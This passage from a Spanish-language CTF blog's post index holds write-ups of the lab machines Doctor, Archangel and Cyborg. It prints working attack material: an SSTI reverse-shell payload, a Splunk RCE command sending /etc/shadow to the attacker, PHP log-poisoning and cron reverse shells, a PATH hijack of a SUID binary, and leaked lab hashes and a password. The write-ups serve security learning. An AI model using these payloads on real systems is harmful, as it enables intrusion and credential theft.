1|admin|admin@doctor.htb|default.gif|$2b$12$Tg2b8u/elwAyfQOvqvxJgOTcsbnkFANIDdv6jVXmxiWsg4IznjI0S 2|doctor|doctor@d.com|default.gif|$2b$12$GKxenfwkogZHS97jty2qkODlTrlQeP90HN9VdN0LHTKwiGB8ANcPi sqlite\u0026gt;   WEB - USER Ejecutamos una shell inversa con la cual logramos obtener una shell con el usuario web.\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \u0026quot;warning\u0026quot; in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\u0026quot;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\u0026quot;10.10.14.224\\\u0026quot;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\u0026quot;/bin/bash\\\u0026quot;]);'\u0026quot;).read().zfill(417)}}{%endif%}{% endfor %} Realizamos una enumeracion en la maquina, encontramos algunos archivos del usuario root los cuales seguramente se ejecutan cada cierto tiempo para restaurar los archivos de la aplicacion web.\n1 2 3 4 5 6 7 8 9  web@doctor:/opt/clean$ ls -lah ls -lah total 52K drwxrwxr-x 2 root root 4,0K Sep 7 15:36 . drwxr-xr-x 4 root root 4,0K Sep 6 17:56 .. -rwxr-xr-x 1 root root 211 Sep 6 16:14 cleandb.py -rwxr-xr-x 1 root root 129 Jul 26 19:35 clean.py -rw-r--r-- 1 root root 36K Sep 6 16:12 site.db web@doctor:/opt/clean$   SHAUN - USER Realizamos una enumeracion y encontramos una contraseña en los logs de apache.\nweb@doctor:/var/log/apache2$ grep password * |grep -v gobuster grep password * |grep -v gobuster backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] \u0026quot;POST /reset_password?email=Guitar123\u0026quot; 500 453 \u0026quot;http://doctor.htb/reset_password\u0026quot; web@doctor:/var/log/apache2$ Utilizamos la contraseña encontrada con el usuario shaun, logramos obtener una shell y nuestra flag user.txt.\nPRIVILEGE ESCALATION Anteriormente encontramos en el puerto 8089 a splunk pero necesitabamos credenciales para poder ejecutar comandos o realizar lectura de archivos, con las credenciales de Shaun ejecutamos el exploit remoto lo que permitio realizar la lectura del archivo /etc/shadow.\nbash bash  1 2 3 4 5 6 7 8 9 10 11 12  kali@kali:~/htb/doctor/SplunkWhisperer2/PySplunkWhisperer2$ python3 PySplunkWhisperer2_remote.py --host doctor.htb --port 8089 --username shaun --password \u0026#34;Guitar123\u0026#34; --payload \u0026#34;curl -F \u0026#39;data=@/etc/shadow\u0026#39; http://10.10.14.224:8081\u0026#34; --lhost 10.10.14.224 Running in remote mode (Remote Code Execution) [.] Authenticating... [+] Authenticated [.] Creating malicious app bundle... [+] Created malicious app bundle in: /tmp/tmpwp69gine.tar [+] Started HTTP server for remote mode [.] Installing app from: http://10.10.14.224:8181/ 10.10.10.209 - - [30/Dec/2020 22:23:59] \u0026#34;GET / HTTP/1.1\u0026#34; 200 - [+] App installed, your code should be running now! Press RETURN to cleanup     1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68  kali@kali:~/htb/doctor$ nc -lvvvp 8081 listening on [any] 8081 ... connect to [10.10.14.224] from doctor.htb [10.10.10.209] 44140 POST / HTTP/1.1 Host: 10.10.14.224:8081 User-Agent: curl/7.68.0 Accept: */* Content-Length: 1976 Content-Type: multipart/form-data; boundary=------------------------56671751738f1529 Expect: 100-continue --------------------------56671751738f1529 Content-Disposition: form-data; name=\u0026#34;data\u0026#34;; filename=\u0026#34;shadow\u0026#34; Content-Type: application/octet-stream root:$6$384TbSO3bB1PWLT1$U8U.j.zBLXobhorPDxOMRZh4eE86lcn7C0dvqRvfJ9qDzreti8HDvXwFZccDat9/HJRNwu04ErVxo3mUwVbs5.:18512:0:99999:7::: daemon:*:18375:0:99999:7::: bin:*:18375:0:99999:7::: sys:*:18375:0:99999:7::: sync:*:18375:0:99999:7::: games:*:18375:0:99999:7::: man:*:18375:0:99999:7::: lp:*:18375:0:99999:7::: mail:*:18375:0:99999:7::: news:*:18375:0:99999:7::: uucp:*:18375:0:99999:7::: proxy:*:18375:0:99999:7::: www-data:*:18375:0:99999:7::: backup:*:18375:0:99999:7::: list:*:18375:0:99999:7::: irc:*:18375:0:99999:7::: gnats:*:18375:0:99999:7::: nobody:*:18375:0:99999:7::: systemd-network:*:18375:0:99999:7::: systemd-resolve:*:18375:0:99999:7::: systemd-timesync:*:18375:0:99999:7::: messagebus:*:18375:0:99999:7::: syslog:*:18375:0:99999:7::: _apt:*:18375:0:99999:7::: tss:*:18375:0:99999:7::: uuidd:*:18375:0:99999:7::: tcpdump:*:18375:0:99999:7::: avahi-autoipd:*:18375:0:99999:7::: usbmux:*:18375:0:99999:7::: rtkit:*:18375:0:99999:7::: dnsmasq:*:18375:0:99999:7::: cups-pk-helper:*:18375:0:99999:7::: speech-dispatcher:!:18375:0:99999:7::: avahi:*:18375:0:99999:7::: kernoops:*:18375:0:99999:7::: saned:*:18375:0:99999:7::: nm-openvpn:*:18375:0:99999:7::: hplip:*:18375:0:99999:7::: whoopsie:*:18375:0:99999:7::: colord:*:18375:0:99999:7::: geoclue:*:18375:0:99999:7::: pulse:*:18375:0:99999:7::: gnome-initial-setup:*:18375:0:99999:7::: systemd-coredump:!!:18463:::::: web:$6$luVwBTOn1q154RLG$KKPgd66FyKM6z.hCPPvOYEVNoZgj/sAagvMrzWSoKrnWICgHo8oRGPzt5glRc7lm6lDfbwk3OUCIfBkYeeCHG0:18463:0:99999:7::: _rpc:*:18464:0:99999:7::: statd:*:18464:0:99999:7::: exim:!:18469:0:99999:7::: sshd:*:18469:0:99999:7::: shaun:$6$xEyi3OGI4XZfW7uM$dPxAIWOZuAFwJj4W69VGT.T1YLlnEvvaphLjswVs4hv5RUtJ7v7F37XfPtwst9Ije3imy4gRcRppsAZLQ81z80:18519:0:99999:7::: splunk:!:18511:0:99999:7::: --------------------------56671751738f1529--       'use strict'; var containerId = JSON.parse(\"\\\"59d3b08e224b5fa0\\\"\"); var containerElem = document.getElementById(containerId); var codetabLinks = null; var codetabContents = null; var ids = []; if (containerElem) { codetabLinks = containerElem.querySelectorAll('.codetab__link'); codetabContents = containerElem.querySelectorAll('.codetab__content'); } for (var i = 0; i 0) { codetabContents[0].style.display = 'block'; }  Ejecutamos una shell inversa con lo que logramos obtener shell con usuario root y la flag root.txt.\n","description":"Doctor expone una aplicacion web en donde encontramos y explotamos una vulnerabilidad de Server Side Template Injection (SSTI) en Python lo que nos permitio obtener acceso. Los Logs de Apache nos permitieron leer la contraseña del siguiente usuario. Explotamos una vulnerabilidad en Splunk lo que nos permitio obtener acceso privilegiado.","id":19,"section":"posts","tags":["splunkd","python","ssti","injection"],"title":"Hack The Box - Doctor","uri":"https://sckull.github.io/posts/doctor/"},{"content":"  Archangel es una maquina de TryHackMe, presenta una vulnerabilidad LFI y mediante envenenamiento de log obtuvimos acceso a la maquina. Modificamos un script que es ejecutado por un cron para realizar movimiento lateral. Finalmente un archivo con permisos SUID y la lectura de su codigo fuente permitió que ejecutaramos bash como root.\nRoom    Titulo Archangel      Descripción Boot2root, Web exploitation, Privilege escalation, LFI   Puntos 210   Dificultad Facil   Maker Archangel     NMAP Escaneo de puertos con nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  # Nmap 7.80 scan initiated Thu Feb 4 19:10:33 2021 as: nmap --min-rate 1000 -p- -T4 -oN portScan archangel.thm Warning: 10.10.84.37 giving up on port because retransmission cap hit (6). Nmap scan report for archangel.thm (10.10.84.37) Host is up (0.31s latency). Not shown: 64873 closed ports, 660 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http # Nmap done at Thu Feb 4 19:12:40 2021 -- 1 IP address (1 host up) scanned in 126.26 seconds # Nmap 7.80 scan initiated Thu Feb 4 19:13:30 2021 as: nmap -p22,80 -sV -sC -oN serviceScan -Pn archangel.thm Nmap scan report for archangel.thm (10.10.84.37) Host is up (0.34s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA) | 256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA) |_ 256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Wavefire Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Feb 4 19:14:04 2021 -- 1 IP address (1 host up) scanned in 34.20 seconds   HTTP Encontramos una pagina web en el puerto 80 y nuevo dominio.\nEn el dominio encontrado vemos nuestra primera flag.\nRUSTBUSTER Utilizamos rustbuster para busqueda de directorios y archivos en el dominio encontrado.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  ~ rustbuster v3.0.3 ~ by phra \u0026amp; ps1dr3x ~tarted at\t: 2021-02-04 19:17:52 GET\t403 Forbidden\thttp://mafialive.thm/.php GET 200 OK http://mafialive.thm/ GET 200 OK http://mafialive.thm/index.html GET 200 OK http://mafialive.thm/robots.txt GET 403 Forbidden http://mafialive.thm/server-status GET 200 OK http://mafialive.thm/test.php [?] Ended at: 2021-02-04 19:23:171   LFI - WWW-DATA (USER) En la pagina test.php vemos que existe una vulnerabilidad LFI ya que se le esta pasando al parametro view la direccion completa del archivo a mostrar en la pagina.\n1 2 3 4 5 6 7 8 9 10 11 12  \u0026lt;!DOCTYPE HTML\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;INCLUDE\u0026lt;/title\u0026gt; \u0026lt;h1\u0026gt;Test Page. Not to be Deployed\u0026lt;/h1\u0026gt; \u0026lt;/button\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;/test.php?view=/var/www/html/development_testing/mrrobot.php\u0026#34;\u0026gt;\u0026lt;button id=\u0026#34;secret\u0026#34;\u0026gt;Here is a button\u0026lt;/button\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;br\u0026gt; Control is an illusion \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   Utilizamos un filtro de PHP para leer y codificar en base64 el archivo test.php con lo que obtuvimos el codigo fuente codificado y al decodificarlo encontramos nuestra segunda flag. Vemos en el codigo que el parametro que se le pase a view debe de tener el string /var/www/html/development_testing y este no debe de contener ../.. por lo que no podriamos leer algun archivo en otra direccion y es necesario buscar y realizar bypas a esta condicional. Para poder hacer un \u0026ldquo;bypass\u0026rdquo; a esta pequeña condicional se incluye la direccion /var/www/html/development_testing dentro de un filtro lo cual nos permitiria leer cualquier archivo.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php [... REDACTED ...]\t\u0026lt;/button\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;/test.php?view=/var/www/html/development_testing/mrrobot.php\u0026#34;\u0026gt;\u0026lt;button id=\u0026#34;secret\u0026#34;\u0026gt;Here is a button\u0026lt;/button\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;br\u0026gt; \u0026lt;?php //FLAG: thm{[... REDACTED ...]} function containsStr($str, $substr) { return strpos($str, $substr) !== false; } if(isset($_GET[\u0026#34;view\u0026#34;])){ if(!containsStr($_GET[\u0026#39;view\u0026#39;], \u0026#39;../..\u0026#39;) \u0026amp;\u0026amp; containsStr($_GET[\u0026#39;view\u0026#39;], \u0026#39;/var/www/html/development_testing\u0026#39;)) { include $_GET[\u0026#39;view\u0026#39;]; }else{ echo \u0026#39;Sorry, Thats not allowed\u0026#39;; } }\t?\u0026gt; [... REDACTED ...]   El filtro quedaria de la siguiente forma php://filter//var/www/html/development_testing/resource=/etc/passwd lo cual nos permite leer el archivo /etc/passwd.\nLogramos tambien leer nuestra flag user.txt.\nRealizamos una enumeracion de archivos pero no encontramos alguna contraseña, verificamos que tuvieramos acceso a los logs de acceso de apache (/var/log/apache2/acess.log) logramos leer dicho archivo.\n1  10.2.29.162 - - [05/Feb/2021:08:07:19 +0530] \u0026#34;GET /robots.txt HTTP/1.1\u0026#34; 404 455 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\u0026#34; 10.2.29.162 - - [05/Feb/2021:08:07:22 +0530] \u0026#34;GET /test.php?view=/var/www/html/development_testing/../../../../../../log/apache2/access.log HTTP/1.1\u0026#34; 200 559 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\u0026#34; 10.2.29.162 - - [05/Feb/2021:08:07:38 +0530] \u0026#34;GET /test.php?view=/var/www/html/development_testing/..///////..////..//////..///////..////..///////var/log/apache2/access.log HTTP/1.1\u0026#34; 200 606 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\u0026#34;   Ya que tenemos acceso a este archivo podemos verificar que sea posible ejecutar codigo para ello realizamos una prueba con phpinfo() enviandolo a travez de una solicitud GET, al revisar el archivo access.log logramos ver que se ejecuto dicha funcion.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  kali@kali:~/thm/archangel$ nc mafialive.thm 80 GET /\u0026lt;?php phpinfo(); ?\u0026gt; HTTP/1.1 400 Bad Request Date: Fri, 05 Feb 2021 00:54:45 GMT Server: Apache/2.4.29 (Ubuntu) Content-Length: 301 Connection: close Content-Type: text/html; charset=iso-8859-1 \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//IETF//DTD HTML 2.0//EN\u0026#34;\u0026gt; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt; \u0026lt;title\u0026gt;400 Bad Request\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt;\u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Bad Request\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;Your browser sent a request that this server could not understand.\u0026lt;br /\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;address\u0026gt;Apache/2.4.29 (Ubuntu) Server at localhost Port 80\u0026lt;/address\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;   Sabiendo esto podemos realizar Log Poisoning enviando codigo php para ejecucion de comandos en una peticion GET y al realizar la lectura del log el codigo se ejecutaría. Existen varias formas de ejecutar comandos se muestra: link se muestra \u0026lt;?php system($_GET['cmd']); \u0026gt; aunque es necesario pasar el comando en el parametro cmd al realizar la lectura. Al intentar con varias funciones solo una funcionó, exec ya que las demás no dejaban que realizaramos la lectura del archivo access.log. El codigo enviado fue el siguiente: \u0026lt;?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.10.10 1338 \u0026gt;/tmp/f') ?\u0026gt; con el cual logramos obtener una shell.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  kali@kali:~/thm/archangel$ nc mafialive.thm 80 GET /\u0026lt;?php exec(\u0026#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.2.29.162 1338 \u0026gt;/tmp/f\u0026#39;) ?\u0026gt; HTTP/1.1 400 Bad Request Date: Fri, 05 Feb 2021 02:53:46 GMT Server: Apache/2.4.29 (Ubuntu) Content-Length: 301 Connection: close Content-Type: text/html; charset=iso-8859-1 \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//IETF//DTD HTML 2.0//EN\u0026#34;\u0026gt; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt; \u0026lt;title\u0026gt;400 Bad Request\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt;\u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Bad Request\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;Your browser sent a request that this server could not understand.\u0026lt;br /\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;address\u0026gt;Apache/2.4.29 (Ubuntu) Server at localhost Port 80\u0026lt;/address\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;   ARCHANGEL - USER Realizamos una enumeracion en la maquina y encontramos en el archivo crontab un script el cual es ejecutado por archangel, dicho archivo tiene permisos de escritura, lectura y ejecucion para todos los usuarios y se ejecuta cada minuto. Agregamos una shell inversa al script y logramos obtener una shell con este usuario y nuestra segunda flag user2.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  www-data@ubuntu:/$ cat /etc/crontab [... REDACTED ...] # m h dom mon dow user\tcommand */1 * * * * archangel /opt/helloworld.sh 17 *\t* * *\troot cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly 25 6\t* * *\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily ) 47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly ) 52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly ) # www-data@ubuntu:/$ cat /opt/helloworld.sh cat /opt/helloworld.sh #!/bin/bash echo \u0026#34;hello world\u0026#34; \u0026gt;\u0026gt; /opt/backupfiles/helloworld.txt www-data@ubuntu:/$ ls -lah /opt/helloworld.sh ls -lah /opt/helloworld.sh -rwxrwxrwx 1 archangel archangel 66 Nov 20 10:35 /opt/helloworld.sh www-data@ubuntu:/$ echo \u0026#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.2.29.162 1339 \u0026gt;/tmp/f\u0026#39; \u0026gt;\u0026gt; /opt/helloworld.sh \u0026lt;|nc 10.2.29.162 1339 \u0026gt;/tmp/f\u0026#39; \u0026gt;\u0026gt; /opt/helloworld.sh www-data@ubuntu:/$   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  archangel@ubuntu:~$ ls -lah ls -lah total 48K drwxr-xr-x 7 archangel archangel 4.0K Feb 5 08:38 . drwxr-xr-x 3 root root 4.0K Nov 18 13:06 .. -rw-r--r-- 1 archangel archangel 220 Nov 18 00:48 .bash_logout -rw-r--r-- 1 archangel archangel 3.7K Nov 18 00:48 .bashrc drwx------ 2 archangel archangel 4.0K Nov 18 13:08 .cache drwxrwxr-x 3 archangel archangel 4.0K Nov 18 11:20 .local drwxr-xr-x 2 archangel archangel 4.0K Nov 18 01:36 myfiles -rw-r--r-- 1 archangel archangel 807 Nov 18 00:48 .profile drwxrwx--- 2 archangel archangel 4.0K Nov 19 20:41 secret -rw-rw-r-- 1 archangel archangel 66 Nov 18 11:20 .selected_editor drwx------ 2 archangel archangel 4.0K Feb 5 08:39 .ssh -rw-r--r-- 1 archangel archangel 26 Nov 19 19:57 user.txt archangel@ubuntu:~$ cd secret cd secret archangel@ubuntu:~/secret$ ls -lah ls -lah total 32K drwxrwx--- 2 archangel archangel 4.0K Nov 19 20:41 . drwxr-xr-x 7 archangel archangel 4.0K Feb 5 08:38 .. -rwsr-xr-x 1 root root 17K Nov 18 16:40 backup -rw-r--r-- 1 root root 49 Nov 19 20:41 user2.txt archangel@ubuntu:~/secret$ cat user2.txt cat user2.txt thm{[... REDACTED ...]} archangel@ubuntu:~/secret$   PRIVILEGE ESCALATION Hacemos una pequeña enumeracion en busqueda de ejecutables con permisos SUID, logramos encontrar un archivo (backup) el cual realiza una copia de todos los archivos de la carpeta myfiles hacia /opt/backupfiles, lo que no se toma en cuenta en el codigo es la direccion completa de cp, por lo que podriamos modificar la variable $PATH para que tome otro ejecutable llamado cp antes que el original (/bin/cp).\nbash c  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  archangel@ubuntu:~/secret$ find / -perm -4000 2\u0026gt;/dev/null |xargs ls -lah -rwsr-xr-x 1 root root 31K Aug 11 2016 /bin/fusermount -rwsr-xr-x 1 root root 43K Sep 17 00:13 /bin/mount -rwsr-xr-x 1 root root 63K Jun 28 2019 /bin/ping -rwsr-xr-x 1 root root 44K Mar 23 2019 /bin/su -rwsr-xr-x 1 root root 27K Sep 17 00:13 /bin/umount -rwsr-xr-x 1 root root 17K Nov 18 16:40 /home/archangel/secret/backup -rwsr-xr-x 1 root root 75K Mar 23 2019 /usr/bin/chfn -rwsr-xr-x 1 root root 44K Mar 23 2019 /usr/bin/chsh -rwsr-xr-x 1 root root 75K Mar 23 2019 /usr/bin/gpasswd -rwsr-xr-x 1 root root 40K Mar 23 2019 /usr/bin/newgrp -rwsr-xr-x 1 root root 59K Mar 23 2019 /usr/bin/passwd -rwsr-xr-x 1 root root 146K Sep 23 20:29 /usr/bin/sudo -rwsr-xr-x 1 root root 19K Jun 28 2019 /usr/bin/traceroute6.iputils -rwsr-xr-- 1 root messagebus 42K Jun 11 2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 10K Mar 28 2017 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 427K Mar 4 2019 /usr/lib/openssh/ssh-keysign archangel@ubuntu:~/secret$ which cp which cp /bin/cp archangel@ubuntu:~/secret$ echo $PATH echo $PATH /usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin archangel@ubuntu:~/secret$     1 2 3 4 5 6 7 8  undefined8 main(void) { setuid(0); setgid(0); system(\u0026#34;cp /home/user/archangel/myfiles/* /opt/backupfiles\u0026#34;); return 0; }       'use strict'; var containerId = JSON.parse(\"\\\"e1a7d7289b458a38\\\"\"); var containerElem = document.getElementById(containerId); var codetabLinks = null; var codetabContents = null; var ids = []; if (containerElem) { codetabLinks = containerElem.querySelectorAll('.codetab__link'); codetabContents = containerElem.querySelectorAll('.codetab__content'); } for (var i = 0; i 0) { codetabContents[0].style.display = 'block'; } \nCreamos un script para que ejecute bash con el nombre cp y le damos permisos de ejecucion, tambien agregamos al inicio la direccion /home/archangel/secret a la variable PATH.\n1 2 3 4 5 6 7 8 9 10  archangel@ubuntu:~/secret$ echo \u0026#34;/bin/bash\u0026#34; \u0026gt; cp echo \u0026#34;/bin/bash\u0026#34; \u0026gt; cp archangel@ubuntu:~/secret$ chmod +x cp chmod +x cp archangel@ubuntu:~/secret$ export PATH=/home/archangel/secret/:$PATH export PATH=/home/archangel/secret/:$PATH archangel@ubuntu:~/secret$ echo $PATH echo $PATH /home/archangel/secret/:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin archangel@ubuntu:~/secret$   Ejecutamos el archivo /home/archangel/secret/backup, logramos obtener una shell con usuario root y la flag root.txt.\n","description":"Archangel es una maquina de TryHackMe, presenta una vulnerabilidad LFI y mediante envenenamiento de log obtuvimos acceso a la maquina. Modificamos un script que es ejecutado por un cron para realizar movimiento lateral. Finalmente un archivo con permisos SUID y la lectura de su codigo fuente permitió que ejecutaramos bash como root.","id":20,"section":"posts","tags":["lfi","lfi log poisoning","rce","suid","ghidra"],"title":"TryHackMe - Archangel","uri":"https://sckull.github.io/posts/archangel/"},{"content":"  Cyborg es una maquina de TryHackMe, encontramos un backup creado con Borg, obtuvimos la contraseña enumerando la pagina web, dentro del backup encontramos las credenciales las cuales utilizamos en SSH. Para escalar privilegios analizamos un script el cual nos permitio dar permisos SUID a bash.\nRoom    Titulo Cyborg      Descripción A box involving encrypted archives, source code analysis and more.   Puntos 300   Dificultad Facil   Maker fieldraccoon     NMAP Escaneo de puertos con nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  # Nmap 7.80 scan initiated Thu Feb 4 13:54:10 2021 as: nmap --min-rate 1000 -p- -T4 -oN portScan cyborg.thm Warning: 10.10.158.178 giving up on port because retransmission cap hit (6). Nmap scan report for cyborg.thm (10.10.158.178) Host is up (0.31s latency). Not shown: 59101 closed ports, 6432 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http # Nmap done at Thu Feb 4 13:57:01 2021 -- 1 IP address (1 host up) scanned in 171.33 seconds # Nmap 7.80 scan initiated Thu Feb 4 14:11:21 2021 as: nmap -sV -sC -oN serviceScan cyborg.thm Nmap scan report for cyborg.thm (10.10.158.178) Host is up (0.28s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA) | 256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA) |_ 256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Feb 4 14:12:25 2021 -- 1 IP address (1 host up) scanned in 64.42 seconds   RUSTBUSTER - HTTP Encontramos el index de apache en el puerto 80, utilizamos rustbuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  ~ rustbuster v3.0.3 ~ by phra \u0026amp; ps1dr3x ~tarted at\t: 2021-02-04 14:13:58 GET\t200 OK\thttp://cyborg.thm/ GET 301 Moved Permanently http://cyborg.thm/admin =\u0026gt; http://cyborg.thm/admin/ GET 301 Moved Permanently http://cyborg.thm/etc =\u0026gt; http://cyborg.thm/etc/ GET 200 OK http://cyborg.thm/index.html GET 403 Forbidden http://cyborg.thm/server-status [?] Ended at: 2021-02-04 14:22:05   Encontramos una pagina web que parece ser estatica, además vemos un nombre Alex (posible usuario) en la descripcion de Setup.\nBORG \u0026gt; ALEX (USER) Encontramos lo que parece ser un chat en la pagina donde vemos dos nuevos nombres Josh, Adam, y donde Alex menciona sobre algun tipo de proxy y que tiene un backup en music_archive.\nAdemás vemos un archivo tar en el menu Archive \u0026gt; Download, el cual descargamos y analizamos. Encontramos archivos los cuales parecen ser archivos creados con BorgBackup, pero al intentar obtener estos archivos borg pide una frase la cual no tenemos por ahora.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  kali@kali:~/thm/cyborg$ tar -xvf archive.tar home/field/dev/final_archive/ home/field/dev/final_archive/hints.5 home/field/dev/final_archive/integrity.5 home/field/dev/final_archive/config home/field/dev/final_archive/README home/field/dev/final_archive/nonce home/field/dev/final_archive/index.5 home/field/dev/final_archive/data/ home/field/dev/final_archive/data/0/ home/field/dev/final_archive/data/0/5 home/field/dev/final_archive/data/0/3 home/field/dev/final_archive/data/0/4 home/field/dev/final_archive/data/0/1 kali@kali:~/thm/cyborg/home/field/dev/final_archive$ file * config: ASCII text data: directory hints.5: data index.5: data integrity.5: data nonce: ASCII text, with no line terminators README: ASCII text kali@kali:~/thm/cyborg/home/field/dev/final_archive$ cat README This is a Borg Backup repository. See https://borgbackup.readthedocs.io/ kali@kali:~/thm/cyborg/home/field/dev/final_archive$   Anteriormente Rustubuster encontro un directorio (/etc/) al cual se le realizó una busqueda nueva, donde encontramos un nuevo directorio que contiene un archivo con una contraseña y un archivo de configuracion de lo que parece ser un \u0026ldquo;proxy\u0026rdquo;. Utilizamos John para obtener la contraseña en texto plano.\nbash bash bash  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  ~ rustbuster v3.0.3 ~ by phra \u0026amp; ps1dr3x ~tarted at : 2021-02-04 15:29:29 GET 200 OK http://cyborg.thm/etc/ GET 403 Forbidden http://cyborg.thm/etc/.html GET 301 Moved Permanently http://cyborg.thm/etc/squid =\u0026gt; http://cyborg.thm/etc/squid/ [... REDACTED ...]     1 2 3 4 5 6 7 8 9 10 11 12 13 14  # HASH # music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn. kali@kali:~/thm/cyborg$ john hash --wordlist=/usr/share/wordlists/rockyou.txt Warning: detected hash type \u0026#34;md5crypt\u0026#34;, but the string is also recognized as \u0026#34;md5crypt-long\u0026#34; Use the \u0026#34;--format=md5crypt-long\u0026#34; option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3]) Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status [... REDACTED ...] (music_archive) 1g 0:00:00:00 DONE (2021-02-04 15:45) 4.347g/s 169460p/s 169460c/s 169460C/s 